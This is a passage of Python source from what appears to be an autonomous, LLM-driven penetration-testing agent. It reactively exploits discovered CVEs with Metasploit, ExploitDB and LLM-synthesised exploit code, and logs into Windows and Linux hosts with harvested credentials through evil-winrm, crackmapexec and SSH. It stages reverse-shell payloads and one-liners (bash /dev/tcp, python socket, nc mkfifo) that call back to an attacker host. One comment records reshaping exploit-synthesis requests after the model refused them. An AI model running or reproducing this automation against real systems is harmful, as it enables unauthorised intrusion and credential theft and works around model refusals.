                "remaining": max(0, len(cmds) - max_commands),
            })

    # ─── Reactive Entry-Attempt Dispatcher (parallel background task) ──
    #
    # The user's requirement: "attempt exploit as soon as it finds a
    # valid entry point, even if other scanning wants to run in
    # parallel. if entry is successful, every focus should move to
    # loot finding and privilege escalation".
    #
    # Implementation: a single async task spawned at engagement start
    # that awaits the EngagementContext's "new entry point" event.
    # Each time the event fires (because record_finding or
    # set_focused_attack triggered detect_entry_points), the
    # dispatcher pops the highest-priority entry point and runs an
    # exploit attempt — concurrently with whatever phase is currently
    # active in the main flow.
    #
    # When entry succeeds (detect_success_signals fires), the
    # context transitions to post_exploit mode and all scanners
    # yield.  The dispatcher then cancels itself.
    async def _entry_attempt_dispatcher(self, target: str) -> None:
        """Background task: react to new entry points immediately.

        Runs alongside the main phase pipeline.  Lives for the
        entire engagement until either (a) the context transitions
        to post_exploit / complete, or (b) the master is cancelled.
        """
        if self._context is None:
            return
        ctx = self._context
        attempts_dispatched = 0
        max_concurrent_attempts = 2     # don't overload the engagement
        in_flight: List[Any] = []
        import logging as _lg
        _log = _lg.getLogger(__name__)
        try:
            while not self._stop_requested:
                # If we've already won, stop dispatching new attempts
                if ctx.is_post_exploit_mode():
                    await self.emit_reasoning(
                        step       = "entry_dispatcher_done_post_exploit",
                        reasoning  = (
                            "Entry succeeded — engagement is in post_exploit "
                            f"mode after {attempts_dispatched} dispatched "
                            "attempt(s).  Stopping entry-attempt dispatcher; "
                            "loot + privesc + lateral pipelines will now run."
                        ),
                        decision   = "STOP entry dispatcher",
                        next_action= "Yield to post-exploit pipelines",
                    )
                    return
                # Wait up to 30s for a new entry-point event, then loop
                # so we periodically re-check the mode + stop signal.
                got = await ctx.wait_for_entry_point(timeout=30.0)
                if not got:
                    # Even without an event, run the detector once in
                    # case findings appeared via legacy code paths
                    # that don't trigger the event.
                    try:
                        new = ctx.detect_entry_points()
                    except Exception:
                        new = []
                    if not new:
                        continue
                # Drain everything currently queued
                while True:
                    ep = ctx.pop_entry_point()
                    if ep is None:
                        break
                    if attempts_dispatched >= max_concurrent_attempts and not all(
                        t.done() for t in in_flight
                    ):
                        # Re-queue and wait a bit
                        ctx.entry_points.insert(0, ep)
                        break
                    attempts_dispatched += 1
                    # Spawn the attempt — runs in parallel with the
                    # main phase pipeline.
                    task = asyncio.create_task(
                        self._execute_entry_attempt(target, ep)
                    )
                    in_flight.append(task)
                    self._background_tasks.append(task)
                # Sweep finished tasks
                in_flight = [t for t in in_flight if not t.done()]
        except asyncio.CancelledError:
            return
        except Exception as exc:                                   # noqa: BLE001
            _log.warning("[entry_dispatcher] unexpected error: %s", exc)

    async def _execute_entry_attempt(self, target: str,
                                         entry: Dict[str, Any]) -> None:
        """Execute ONE entry-point attempt.

        The entry's ``type`` field determines what kind of attempt:
          * pre_staged_commands   — bash-execute up to 3 commands
          * focused_endpoints     — curl each endpoint sequentially
          * exploitable_cve       — emit reasoning so the LLM picks the
                                     concrete exploit module
          * finding_match         — emit reasoning + queue a follow-up
          * credentials_available — try evil-winrm / ssh / etc. with creds
        """
        ctx = self._context
        if ctx is None:
            return
        etype = entry.get("type")
        priority = entry.get("priority", 5)
        await self.emit_reasoning(
            step       = "entry_attempt_dispatched",
            reasoning  = (
                f"Entry-point dispatcher firing: type={etype!r} "
                f"priority={priority}.  Running in PARALLEL with the "
                f"current phase (no blocking)."
            ),
            decision   = f"DISPATCH entry attempt: {etype}",
            next_action= "Execute attempt; success will pivot engagement to post_exploit",
        )

        try:
            if etype == "pre_staged_commands":
                for cmd in (entry.get("commands") or [])[:3]:
                    cmd = (cmd or "").split("#", 1)[0].strip()
                    if not cmd or self._stop_requested:
                        break
                    if ctx.is_post_exploit_mode():
                        break
                    # Shared ledger — don't re-run a command already executed by
                    # the OSINT inline / _phase_exploit first-strike consumers.
                    if self._first_strike_already_run(cmd):
                        continue
                    try:
                        await self._dispatch_to_agent(
                            tool="bash", args=cmd,
                            purpose=f"Entry attempt ({etype})",
                            phase="entry_attempt", timeout=180,
                        )
                    except Exception:
                        continue

            elif etype == "focused_endpoints":
                for ep in (entry.get("endpoints") or [])[:5]:
                    if self._stop_requested or ctx.is_post_exploit_mode():
                        break
                    try:
                        await self._dispatch_to_agent(
                            tool="bash", args=ep,
                            purpose=f"Entry attempt ({etype})",
                            phase="entry_attempt", timeout=60,
                        )
                    except Exception:
                        continue

            elif etype == "credentials_available":
                # Universal credential-test cascade: try the creds
                # against discovered services.  AD chains use evil-winrm
                # /  crackmapexec; SSH targets use sshpass.  We emit a
                # reasoning step here and let the LLM-driven exploit
                # phase decide the best vector.
                await self.emit_reasoning(
                    step       = "creds_available",
                    reasoning  = (
                        f"Credentials harvested: {len(entry.get('creds') or [])}.  "
                        f"Trying them against discovered services."
                    ),
                    decision   = "TEST creds against all eligible services",
                    next_action= "Will dispatch evil-winrm / sshpass / crackmapexec auth-probe",
                )

            elif etype == "exploitable_cve":
                # A vulnerability with a concrete CVE was identified.
                # Exploit it NOW (public exploit from the internet via
                # searchsploit/Metasploit, or a built payload via the
                # web/metasploit chains) — in parallel with the rest of
                # the engagement — instead of merely surfacing it to the
                # slow LLM planner.
                await self._attempt_exploit_for_cves(
                    target, entry.get("cves") or []
                )

            elif etype == "finding_match":
                # Reasoning-only entry — surface it to the LLM so the next
                # exploit-planning cycle picks it up.  (Title-pattern
                # matches without a concrete CVE/command to fire yet.)
                await self.emit_reasoning(
                    step       = "entry_finding_surfaced",
                    reasoning  = (
                        f"Entry-point finding surfaced: {entry.get('subtype') or entry.get('cves')}.  "
                        f"LLM exploit planner will incorporate on next cycle."
                    ),
                    decision   = "SURFACE to LLM planner",
                    next_action= "Continue parallel scanning + await LLM action",
                )
        except Exception as exc:                                # noqa: BLE001
            import logging as _lg
            _lg.getLogger(__name__).warning(
                "[entry_attempt] %s failed: %s", etype, exc,
            )

    async def _attempt_exploit_for_cves(self, target: str, cves: list) -> None:
        """Reactively exploit identified CVEs — in PARALLEL with the rest
        of the engagement.

        Operator directive: "once a vulnerability is found, it should be
        exploited by payload from internet or custom payload built through
        LLM.  Let the other recon/vulnerability processes run in parallel."

        This is the reactive trigger that satisfies it.  The moment a CVE
        is identified (by recon, the vuln scan, or OSINT synthesis) the
        entry-attempt dispatcher calls this method from its background task
        — so exploitation starts IMMEDIATELY without blocking, or being
        blocked by, ongoing recon/vuln scanning.

        It delegates to ``ExploitOrchestrator`` which races (first-to-win,
        laggards cancelled) the full set of acquisition strategies:
          • searchsploit  — public exploit code from the local ExploitDB
          • metasploit    — MSF module auto-selected from the CVE/service
                            (built/staged payload delivery)
          • web_exploit   — web RCE payload chains
          • credential_spray — service auth attempts
        A landed shell is promoted via ``register_shell`` so the loot /
        privesc / lateral pipelines fire and the human gets an interactive
        session.
        """
        if not cves or self._context is None:
            return
        # Don't pile on once we've already won.
        try:
            if self._context.is_post_exploit_mode():
                return
        except Exception:
            pass

        # ── Exploitability triage (initial-access only) ──────────────────────
        # A real tester never fires at CVEs that can't yield access.  Drop
        # DoS / info-leak / client-side / local-privesc / fabricated CVEs so the
        # exploit budget AND the LLM synthesis target only access primitives.
        # If triage empties the list, that's a signal to pursue the WEB surface
        # (Tier-1 web chains) instead of CVE/synthesis exploitation.
        try:
            from agents.exploit.exploitability import triage as _cve_triage
            from datetime import datetime as _dt
            _descr: Dict[str, str] = {}
            for _v in (self._intel.get("vulnerabilities") or []):
                if isinstance(_v, dict):
                    _vc = _v.get("cves") or ([_v.get("cve")] if _v.get("cve") else [])
                    for _c in _vc:
                        if _c:
                            _descr[str(_c).upper()] = _v.get("description") or _v.get("title") or ""
            _kept, _dropped = _cve_triage(
                list(cves), current_year=_dt.utcnow().year, descriptions=_descr)
            if _dropped:
                await self.emit_reasoning(
                    step       = "cve_exploitability_triage",
                    reasoning  = (
                        f"Triaged {len(cves)} CVE(s) for initial-access viability. "
                        f"Dropped {len(_dropped)} non-access: "
                        + "; ".join(f"{c} ({r})" for c, r in _dropped[:6])
                    ),
                    decision   = (
                        f"Pursue {len(_kept)} access-relevant CVE(s)"
                        if _kept else
                        "No access-relevant CVE — pivot to web-surface exploitation"
                    ),
                    next_action= "Exploit only what can land a foothold",
                )
            cves = _kept
        except Exception:
            pass

        try:
            from agents.exploit.exploit_orchestrator import ExploitOrchestrator
            import db.mongo_client as _db

            orch = ExploitOrchestrator(broadcast=self._make_sa_broadcast())
            orch._session_id = self._session_id

            lm    = getattr(self, "listener_manager", None)
            lhost = (getattr(lm, "lhost", None) if lm else None) or self._auto_detect_lhost()
            lport = 4444
            services = list(self._intel.get("services", {}).values())
            web_urls = [
                f"http{'s' if int(str(p)) in (443, 8443) else ''}://{target}:{p}"
                for p, s in self._intel.get("services", {}).items()
                if any(x in (s.get("service", "") if isinstance(s, dict) else str(s)).lower()
                       for x in ("http", "https"))
            ][:3]

            await self.emit_reasoning(
                step       = "reactive_cve_exploit",
                reasoning  = (
                    f"Vulnerability identified ({', '.join(str(c) for c in cves[:3])}) — "
                    f"launching exploitation NOW: searchsploit/ExploitDB + Metasploit "
                    f"module + web payload chains race first-to-win, in parallel with "
                    f"ongoing recon/vuln scanning."
                ),
                decision   = "EXPLOIT IDENTIFIED CVE IMMEDIATELY",
                next_action= "Run parallel exploit chains; a landed shell pivots to post-exploit",
            )

            # C10 — don't race a second orchestrator if _phase_exploit's is live.
            if getattr(self, "_exploit_orch_active", False):
                await self.emit_reasoning(
                    step       = "exploit_orch_dedup",
                    reasoning  = ("An ExploitOrchestrator is already running for "
                                  "this engagement — not racing a second one for "
                                  "these CVEs."),
                    decision   = "SKIP duplicate concurrent orchestrator",
                    next_action= "Let the in-flight orchestrator finish",
                )
                return
            self._exploit_orch_active = True
            try:
                res = await orch.run(
                    session_id = self._session_id,
                    target     = target,
                    db         = _db.get_db(),
                    services   = services,
                    cves       = list(cves),
                    open_ports = self._intel.get("open_ports", []),
                    web_urls   = web_urls,
                    lhost      = lhost,
                    lport      = lport,
                )
            finally:
                self._exploit_orch_active = False

            if isinstance(res, dict) and res.get("shell_obtained"):
                try:
                    await self.register_shell(
                        source   = "reactive_cve_exploit",
                        user     = res.get("user") or "unknown",
                        host     = target,
                        method   = res.get("method") or "cve_exploit",
                        evidence = str(res.get("evidence") or "")[:300],
                    )
                except Exception:
                    pass
            elif cves:
                # ── TIER 2: LLM exploit-code synthesis ──────────────────
                # Tier-1 (public exploits + built payloads) landed nothing.
                # Escalate to bespoke LLM-synthesized exploit code ONLY when an
                # access-relevant CVE survived triage — synthesizing a remote
                # RCE from "no real vuln, just a web port" is what produced the
                # garbage prompts the model refused.  No CVE → rely on the
                # Tier-1 web chains (web_exploit) instead.
                tier1_out = str((res or {}).get("evidence") or "") if isinstance(res, dict) else ""
                await self._attempt_synth_exploitation(
                    target      = target,
                    cves        = list(cves),
                    services    = services,
                    open_ports  = self._intel.get("open_ports", []),
                    web_urls    = web_urls,
                    lhost       = lhost,
                    lport       = lport,
                    prior_output= tier1_out,
                )
        except Exception as exc:                                # noqa: BLE001
            import logging as _lg
            _lg.getLogger(__name__).warning(
                "[reactive_cve_exploit] failed (non-fatal): %s", exc,
            )

    async def _attempt_synth_exploitation(
        self,
        target:      str,
        cves:        list,
        services:    list,
        open_ports:  list,
        web_urls:    list,
        lhost:       str = "",
        lport:       int = 4444,
        prior_output: str = "",
    ) -> None:
        """TIER 2 — LLM exploit-code synthesis fallback.

        Fires only when Tier-1 (public exploits + built payloads) failed to
        land a shell.  Runs the ``ExploitSynthSubagent`` synthesize → run →
        observe → refine loop, streaming the whole development to the Exploit
        Lab panel via ``exploit_lab`` events.  A landed shell is promoted via
        ``register_shell`` so the post-exploit / loot / privesc pipelines fire
        and the human gets an interactive session.
        """
        if not cves and not services:
            return
        try:
            if self._context is not None and self._context.is_post_exploit_mode():
                return
        except Exception:
            pass
        try:
            from agents.exploit.exploit_synth_subagent import ExploitSynthSubagent
            import db.mongo_client as _db

            await self.emit_reasoning(
                step       = "tier2_exploit_synth",
                reasoning  = (
                    "Tier-1 exploitation (public exploits + built payloads) did "
                    "not land a shell.  Escalating to Tier-2: LLM exploit-code "
                    "synthesis — writing, running, observing and refining a "
                    "bespoke PoC live in the Exploit Lab."
                ),
                decision   = "SYNTHESIZE CUSTOM EXPLOIT (Tier-2)",
                next_action= "Stream synth→run→observe→refine to the Exploit Lab panel",
            )

            synth = ExploitSynthSubagent(
                session_id    = self._session_id,
                target        = target,
                broadcast     = self._make_sa_broadcast(),
                db            = _db.get_db(),
                think_json_fn = self.think_json,
            )
            # Track so an operator Stop / teardown cancels in-flight synthesis.
            try:
                self._subagents_active = getattr(self, "_subagents_active", [])
                self._subagents_active.append(synth)
            except Exception:
                pass

            res = await synth.run(
                target     = target,
                cves       = list(cves),
                services   = services,
                open_ports = open_ports,
                web_urls   = web_urls,
                lhost      = lhost,
                lport      = lport,
                prior_output = prior_output,
            )

            pd = getattr(res, "parsed_data", {}) or {}
            if pd.get("shell_obtained"):
                try:
                    await self.register_shell(
                        source   = "exploit_synth",
                        user     = pd.get("user") or "unknown",
                        host     = target,
                        method   = pd.get("method") or "llm_synth_exploit",
                        evidence = str(pd.get("evidence") or "")[:300],
                    )
                except Exception:
                    pass
        except Exception as exc:                                # noqa: BLE001
            import logging as _lg
            _lg.getLogger(__name__).warning(
                "[tier2_exploit_synth] failed (non-fatal): %s", exc,
            )

    # ─── PHASE: Exploitation ──────────────────────────────────

    def _detect_target_os(self) -> str:
        """Reliably classify the target OS and cache it into intel['os_guess'].

        ROOT CAUSE FIX: nmap -O is root-only, so when ARGUS is not root the
        OS guess stays 'unknown' — which mis-routed every tech-specific stage
        (a Windows AD DC was handed a Linux msfvenom payload and the WinRM
        shell path was skipped).  This derives the OS from the unprivileged
        `-sV` service banners + the open-port fingerprint (always available),
        so os_guess is dependable regardless of privilege level.

        Returns normalised ``'windows'`` / ``'linux'`` / ``''`` and never raises.
        """
        cur = (self._intel.get("os_guess") or "").strip().lower()
        if cur and cur != "unknown":
            if "windows" in cur:
                return "windows"
            if any(x in cur for x in ("linux", "ubuntu", "debian", "centos",
                                      "unix", "bsd", "rhel", "fedora")):
                return "linux"
            # Concrete-but-unrecognised guess — re-derive below.
        try:
            from agents.exploit.exploitability import infer_os
            os_kind = infer_os(self._intel)
        except Exception:
            os_kind = ""
        if os_kind and cur in ("", "unknown"):
            self._intel["os_guess"] = os_kind.capitalize()
        return os_kind

    async def _attempt_windows_credential_shell(
        self, target: str, creds: list, ports: set
    ) -> None:
        """Tech-correct Windows foothold: authenticate with harvested creds.

        For a Windows / AD host with valid credentials the real-world play is
        a credential LOGIN (evil-winrm over WinRM, or an SMB exec primitive) —
        NOT dropping a Linux reverse-shell payload.  Tries WinRM first (lands
        an interactive shell via the evil-winrm PTY route), then falls back to
        an SMB validation/share-enum.  Fully guarded; never raises.
        """
        try:
            cred = creds[0] if creds else {}
            if not isinstance(cred, dict):
                return
            user = (cred.get("user") or cred.get("username") or "").strip()
            pw   = (cred.get("password") or cred.get("pass") or "").strip()
            dom  = (cred.get("domain") or "").strip()
            if not user:
                return
            uarg = f"{dom}\\{user}" if dom else user
            await self.emit_reasoning(
                step       = "windows_cred_foothold",
                reasoning  = (
                    f"Windows target with valid credentials ({uarg}) and "
                    f"WinRM/SMB exposed.  The tech-correct foothold is a "
                    f"credential login (evil-winrm / netexec), NOT a Linux "
                    f"reverse-shell payload."
                ),
                decision   = "LOGIN with Windows credentials (evil-winrm → SMB fallback)",
                next_action= "Spawn evil-winrm PTY; on success register an interactive shell",
            )
            dflag = f" -d {dom}" if dom else ""
            if ports & {5985, 5986}:
                # Validate creds + detect (Pwn3d!) WinRM shell access.
                await self._dispatch_to_agent(
                    tool="crackmapexec",
                    args=f"winrm {target} -u '{user}' -p '{pw}'{dflag}",
                    purpose="Validate creds + check WinRM shell access (Pwn3d!)",
                    phase="exploit", timeout=120,
                )
                # Spawn the interactive evil-winrm PTY (routes to
                # _dispatch_evil_winrm, which registers a shell on success and
                # fails gracefully if the user is not in Remote Management Users).
                await self._dispatch_to_agent(
                    tool="evil-winrm",
                    args=f"-i {target} -u {user} -p {pw}",
                    purpose="Interactive WinRM shell via harvested credentials",
                    phase="exploit", timeout=90,
                )
            elif ports & {445}:
                await self._dispatch_to_agent(
                    tool="crackmapexec",
                    args=f"smb {target} -u '{user}' -p '{pw}'{dflag} --shares",
                    purpose="Validate creds via SMB + enumerate shares",
                    phase="exploit", timeout=120,
                )
        except Exception as exc:                                  # noqa: BLE001
            try:
                import logging as _lg
                _lg.getLogger(__name__).warning(
                    "[win_cred_shell] %s failed: %s", target, exc
                )
            except Exception:
                pass

    async def _auto_generate_payload(
        self,
        platform:     str = "linux",
        fmt:          str = "elf",
        payload_type: str = "stageless",
        lport:        int = 0,
        start_listener: bool = True,
    ) -> Optional[Dict]:
        """Autonomously build a reverse-shell payload + start a listener.

        The user's requirement: "ARGUS should also be able to develop
        exploits for issues found, hence the payload agents are
        available."  Previously PayloadAgent was REST-only and never
        fired during an autonomous engagement (self._payload_agent
        stayed None).  This helper:

          1. Generates a platform-appropriate reverse-shell payload via
             msfvenom (PayloadAgent.generate).
          2. Starts a matching PTY-backed listener via ShellAgent so a
             caught shell is immediately interactive for the human
             operator in the GUI Shell Manager.

        Returns the payload metadata dict (with output_path + listener
        details) or None on failure.  Never raises.
        """
        try:
            from agents.payload_agent import PayloadAgent
            if getattr(self, "_payload_agent", None) is None:
                self._payload_agent = PayloadAgent(broadcast=self.broadcast)
                self._payload_agent._session_id = self._session_id
            # Pick a port: default to an unused 44xx so multiple payloads
            # don't collide.
            if not lport:
                base = 4444 + (len(getattr(self, "_generated_payloads", []) or []))
                lport = base
            lhost = self._auto_detect_lhost() if hasattr(self, "_auto_detect_lhost") else None
            payload = await self._payload_agent.generate(
                session_id   = self._session_id,
                platform     = platform,
                fmt          = fmt,
                lport        = lport,
                lhost        = lhost or None,
                payload_type = payload_type,
            )
            self._generated_payloads = (getattr(self, "_generated_payloads", []) or [])
            self._generated_payloads.append(payload)
            # ── Make the staged payload CONSUMABLE by the exploit layer ──────
            # Previously _generated_payloads was built but NEVER read, so the
            # listener waited for a callback that never came.  Stash delivery
            # primitives + ready reverse-shell one-liners in intel so any RCE
            # primitive (web_exploit, cmdi, the LLM exploit planner, the
            # finding-triggers) can deliver the payload or just fire a reverse
            # shell back to the live listener.
            try:
                _lh = lhost or "LHOST"
                self._intel.setdefault("staged_payloads", []).append({
                    "platform":     platform, "fmt": fmt,
                    "path":         payload.get("output_path"),
                    "lhost":        _lh, "lport": lport,
                    "listener_cmd": payload.get("listener_cmd"),
                })
                self._intel["reverse_shell_oneliners"] = {
                    "lhost": _lh, "lport": lport,
                    "bash":   f"bash -c 'bash -i >& /dev/tcp/{_lh}/{lport} 0>&1'",
                    "python": (f"python3 -c 'import socket,subprocess,os;"
                               f"s=socket.socket();s.connect((\"{_lh}\",{lport}));"
                               f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                               f"subprocess.call([\"/bin/sh\",\"-i\"])'"),
                    "nc":     f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {_lh} {lport} >/tmp/f",
                }
            except Exception:
                pass
            await self.emit_reasoning(
                step       = "payload_developed",
                reasoning  = (
                    f"Auto-generated {platform}/{fmt} reverse-shell payload "
                    f"({payload.get('payload_name','?')}) at "
                    f"{payload.get('output_path','?')}. "
                    f"Listener: {payload.get('listener_cmd','?')[:80]}"
                ),
                decision   = "PAYLOAD READY for delivery",
                next_action= "Exploit subagents can upload/execute it for a shell",
            )
            # Start a PTY-backed listener so a caught shell is human-usable
            # in the GUI Shell Manager.  Uses a "reverse_shell" socat PTY
            # listener (meterpreter payloads still catch fine; the operator
            # can upgrade in-GUI).
            if start_listener and payload.get("success"):
                try:
                    import uuid as _uuid
                    from agents.shell_agent import ShellAgent
                    if getattr(self, "_shell_agent", None) is None:
                        self._shell_agent = ShellAgent(broadcast=self.broadcast)
                        self._shell_agent._session_id = self._session_id
                        self._shell_agent._master = self
                    await self._shell_agent.create_listener(
                        session_id = self._session_id,
                        shell_id   = f"auto-{_uuid.uuid4().hex[:8]}",
                        shell_type = "reverse_shell",
                        lport      = lport,
                        lhost      = lhost or None,
                    )
                except Exception as _le:
                    import logging as _ll
                    _ll.getLogger(__name__).debug(
                        "[payload] listener start failed: %s", _le)
            return payload
        except Exception as exc:                                     # noqa: BLE001
            import logging as _ll
            _ll.getLogger(__name__).warning(
                "[payload] auto-generate failed (non-fatal): %s", exc)
            return None

    async def _phase_exploit(self, target: str):
        """
        Master-directed exploitation.
        Master LLM plans each attack vector based on all gathered intel.
        ExploitAgent executes exactly what Master specifies, uses LLM only
        to extract findings from output. Master evaluates and plans next vector.
        """
        await self._advance_phase(AttackPhase.EXPLOIT)
        await self._emit("plan_step_update", {
            "step_id": "exploit", "status": "active",
            "result":  f"Master planning exploitation for {target}",
            "detail":  "", "found": None, "ts": datetime.utcnow().isoformat()
        })

        from agents.exploit_agent import ExploitAgent
        agent = ExploitAgent(broadcast=self.broadcast)
        agent._session_id = self._session_id
        self._exploit_agent = agent

        # ── Tech-correct foothold staging ────────────────────────────
        # Route the initial-access attempt to the technology actually
        # detected — NOT a hardcoded Linux default.  Root-cause of the
        # "Windows AD DC handed a Linux msfvenom payload" bug: os_guess was
        # "unknown" (nmap -O is root-only), so the old os_guess substring test
        # fell through to the Linux branch.  We now classify the OS robustly
        # from service banners + ports, and for a Windows host with creds we
        # LOG IN (evil-winrm/SMB) instead of dropping an ELF reverse shell.
        try:
            _os = self._detect_target_os()      # robust: banners + ports, not just -O
            _ports = set()
            for p in (self._intel.get("open_ports") or []):
                try:
                    _ports.add(int(str(p).split("/")[0]))
                except Exception:
                    continue
            _web_present = bool(self._intel.get("web_paths")) or bool(
                _ports & {80, 443, 8080, 8443, 8000, 8888})
            _creds = self._intel.get("credentials") or []
            _win_login = bool(_ports & {5985, 5986, 445})

            if not self._intel.get("shell_access"):
                if _os == "windows":
                    # Windows: credential login is the foothold; never an ELF.
                    if _creds and _win_login:
                        await self._attempt_windows_credential_shell(target, _creds, _ports)
                    elif _web_present:
                        await self._auto_generate_payload(platform="windows", fmt="exe")
                elif _os == "linux":
                    if _creds and (_ports & {22}):
                        # SSH login with harvested creds is the Linux analogue.
                        await self.emit_reasoning(
                            step="linux_cred_foothold",
                            reasoning="Linux target with credentials + SSH open — "
                                      "attempting an authenticated SSH foothold.",
                            decision="LOGIN via sshpass/ssh with harvested creds",
                            next_action="Establish interactive SSH session",
                        )
                        if _web_present:
                            await self._auto_generate_payload(platform="linux", fmt="elf")
                    elif _web_present:
                        await self._auto_generate_payload(platform="linux", fmt="elf")
                else:
                    # OS still genuinely unknown — use a PORT heuristic instead
                    # of blindly defaulting to Linux.
                    if _ports & {445, 135, 139, 3389, 5985, 88, 389}:
                        if _creds and _win_login:
                            await self._attempt_windows_credential_shell(target, _creds, _ports)
                        elif _web_present:
                            await self._auto_generate_payload(platform="windows", fmt="exe")
                    elif _web_present:
                        await self._auto_generate_payload(platform="linux", fmt="elf")
        except Exception:
            pass

        # ── FIRST-STRIKE LOOP ──────────────────────────────────────
        # When OSINT synthesis identified a concrete kill-chain
        # (intel["next_commands"] populated, severity critical/high),
        # execute those commands FIRST, before any heuristic planning.
        # This is what turns "3 hours of curl flood with 0 findings"
        # into "30 minutes to initial access".  See pivot_to_exploit flag
        # set in _phase_osint above.
        first_strike_cmds: List[str] = list(
            self._intel.get("next_commands") or []
        )
        first_strike_consumed = 0
        if first_strike_cmds and self._intel.get("pivot_to_exploit"):
            await self.emit_reasoning(
                step       = "exploit_first_strike",
                reasoning  = (f"OSINT synthesis pre-staged "
                              f"{len(first_strike_cmds)} command(s) targeting "
                              f"{self._intel.get('critical_cves', [])[:3]}. "
                              f"Executing these BEFORE generic exploit planning."),
                decision   = "FIRST-STRIKE mode",
                next_action= f"Dispatching {min(6, len(first_strike_cmds))} pre-staged commands",
            )
            for cmd_idx, raw_cmd in enumerate(first_strike_cmds[:6]):
                if self._stop_requested or self._intel.get("shell_access"):
                    break
                cmd = (raw_cmd or "").strip()
                if not cmd:
                    continue
                # Strip trailing comments (LLM often appends "# CVE-...")
                cmd_no_comment = cmd.split("#", 1)[0].strip()
                if not cmd_no_comment:
                    continue
                # Shared ledger — skip if already run by another consumer
                # (inline first-strike / entry dispatcher) or a prior
                # _phase_exploit invocation.  Kills the duplicate 11-min chains.
                if self._first_strike_already_run(cmd_no_comment):
                    continue
                # Tool is the first whitespace-separated token; rest is args
                parts = cmd_no_comment.split(None, 1)
                tool  = parts[0]
                args  = parts[1] if len(parts) > 1 else ""

                fs_label = f"first_strike_{cmd_idx+1}"
                await self._emit("plan_step_update", {
                    "step_id":  fs_label,
                    "label":    f"💥 First-strike: {tool}",
                    "icon":     "🎯",
                    "status":   "active",
                    "result":   f"Pre-staged: {cmd_no_comment[:80]}",
                    "detail":   f"OSINT-identified kill-chain command #{cmd_idx+1}",
                    "found":    None,
                    "ts":       datetime.utcnow().isoformat(),
                })
                try:
                    # Use the standard dispatch so output is captured + parsed
                    # the same way as LLM-planned commands.  Phase tagged
                    # as "exploit" so findings land in the right bucket.
                    output = await self._dispatch_to_agent(
                        tool=tool, args=args, phase="exploit",
                        target=target, timeout=120,
                    )
                    first_strike_consumed += 1
                    await self.emit_reasoning(
                        step       = fs_label,
                        reasoning  = f"Pre-staged command produced "
                                      f"{len(output or '')} chars of output",
                        decision   = "Continuing first-strike sequence",
                        next_action= "Next pre-staged command (or fall back "
                                      "to LLM planner if all consumed)",
                    )
                    # Ingest as loot so the credential pipeline + LLM
                    # response-parser see anything interesting (root creds,
                    # env vars, tokens) leaked by the kill-chain endpoint.
                    if output:
                        self.ingest_loot(output, source=fs_label, tool=tool)
                    # Early exit if shell obtained mid-strike
                    if self._intel.get("shell_access"):
                        break
                except Exception as _fs_err:
                    await self.emit_reasoning(
                        step       = fs_label,
                        reasoning  = f"First-strike command failed: {_fs_err}",
                        decision   = "Continuing to next pre-staged command",
                        next_action= "Recovery: try remaining commands or fall back to LLM planner",
                    )
            # Mark the queue consumed so the LLM planner below knows
            # whether to do generic enumeration or pick up the slack.
            self._intel["first_strike_consumed"] = first_strike_consumed
            # Don't drain next_commands — keep for audit + retry semantics
            if first_strike_consumed > 0 and self._intel.get("shell_access"):
                await self._emit("plan_step_update", {
                    "step_id": "exploit", "status": "done",
                    "result": "Initial access obtained via first-strike chain",
                    "detail": f"Consumed {first_strike_consumed} pre-staged command(s)",
                    "found":  True,
                    "ts": datetime.utcnow().isoformat(),
                })
                return  # short-circuit — we have a shell, post-ex will pick it up

        exploit_plan = self._safe_llm_result(await self._llm_plan_exploitation(target))
        await self.emit_reasoning(
            step       = "exploit_planning",
            reasoning  = exploit_plan.get("reasoning",""),
            decision   = f"Strategy: {exploit_plan.get('primary_strategy','')}",
            next_action= f"{len(exploit_plan.get('attack_vectors',[]))} attack vectors queued"
                          + (f" (after {first_strike_consumed} first-strike)"
                              if first_strike_consumed else "")
        )

        for i, vector in enumerate(_safe_list(exploit_plan.get("attack_vectors"))[:10]):
            if self._stop_requested or self._intel["shell_access"]:
                break

            # Master builds exact command
            vi = self._safe_llm_result(await self._llm_build_exploit_command(target, vector))
            if not vi.get("tool"):
                continue

            vec_label = f"{vi.get('tool',vector.get('type','?'))} — {vector.get('description','')[:60]}"
            await self._emit("plan_step_update", {
                "step_id":  f"exploit_v{i+1}",
                "label":    vec_label,
                "icon":     "💥",
                "status":   "active",
                "result":   f"Trying: {vec_label}",
                "detail":   f"Command: {vi.get('command',vi.get('args','')[:120])}",
                "found":    None,
                "ts":       datetime.utcnow().isoformat()
            })
            await self.emit_reasoning(
                step       = f"exploit_v{i+1}",
                reasoning  = vector.get("rationale",""),
                decision   = f"{vector.get('type','')} — {vector.get('description','')}",
                next_action= vi.get("command","")
            )

            # Recommendation C — if the LLM specified lhost/lport/pre_command,
            # spin up a real listener around the exploit fire so reverse-shell
            # payloads have somewhere to call back to.  Without this every
            # reverse_tcp/reverse_https payload is a no-op.
            needs_listener = bool(
                vi.get("lhost") or vi.get("lport") or vi.get("pre_command")
                or "reverse" in (vi.get("args") or "").lower()
                or "lhost=" in (vi.get("args") or "").lower()
            )
            lm = getattr(self, "listener_manager", None)
            captured = False
            if needs_listener and lm is not None:
                # Recommendation C — FORCE the manager's lhost.  The
                # listener binds locally on lm.lhost; any payload that
                # calls back must target the same address or no callback
                # ever lands.  An LLM-supplied lhost that disagrees with
                # the local interface is a guaranteed silent failure, so
                # we override unconditionally.  Operator override flows
                # via lm.set_lhost(), not the LLM JSON.
                lhost = lm.lhost
                # The manager allocates the port itself; the LLM's lport
                # is a hint for collision avoidance but not authoritative.
                try:
                    lport = int(vi.get("lport") or 4444)
                except Exception:
                    lport = 4444

                # Substitute placeholders + force-rewrite any literal
                # LHOST=…/LPORT=… emitted by the LLM so even an
                # over-confident model can't break the callback path.
                import re as _re
                _args = (vi.get("args") or "")
                for placeholder, value in (
                    ("LHOST=PLACEHOLDER", f"LHOST={lhost}"),
                    ("LPORT=PLACEHOLDER", f"LPORT={lport}"),
                    ("<lhost>", lhost), ("<LHOST>", lhost),
                    ("<lport>", str(lport)), ("<LPORT>", str(lport)),
                ):
                    _args = _args.replace(placeholder, value)
                # LHOST=<anything> → LHOST=<lm.lhost>
                _args = _re.sub(
                    r"\bLHOST\s*=\s*\S+",
                    f"LHOST={lhost}",
                    _args, flags=_re.IGNORECASE,
                )
                # LPORT=<digits> → LPORT=<our chosen lport>
                _args = _re.sub(
                    r"\bLPORT\s*=\s*\d+",
                    f"LPORT={lport}",
                    _args, flags=_re.IGNORECASE,
                )
